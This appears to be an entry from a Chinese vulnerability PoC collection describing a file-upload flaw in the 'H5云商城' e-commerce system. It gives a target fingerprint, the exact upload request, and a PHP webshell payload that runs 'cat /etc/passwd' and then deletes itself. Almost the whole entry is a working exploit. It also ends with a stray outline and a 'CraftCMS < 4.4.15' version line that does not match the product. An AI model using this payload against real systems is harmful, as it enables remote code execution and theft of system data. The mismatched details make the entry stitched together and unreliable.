# H5云商城file.php存在文件上传漏洞

- **系统**：H5云商城　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="/public/qbsp.php"`
- **请求**：`POST /admin/commodtiy/file.php?upload=1 HTTP/1.1`
- **关键头**：`Host: your-ip`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFQqYtrIW…`

**请求体 / payload**
```
------WebKitFormBoundaryFQqYtrIWb8iBxUCx
Content-Disposition: form-data; name="file"; filename="rce.php"
Content-Type: application/octet-stream
<?php system("cat /etc/passwd");unlink(__FILE__);?>
------WebKitFormBoundaryFQqYtrIWb8iBxUCx--
/admin/commodtiy/upload/20240608120546.php
>
```

**其他**
- H5 云商城 file.php存在文件上传漏洞: + 一、漏洞描述
+ 二、影响版本
+ 三、资产测绘
+ 四、漏洞复现
---
- 版本: CraftCMS < 4.4.15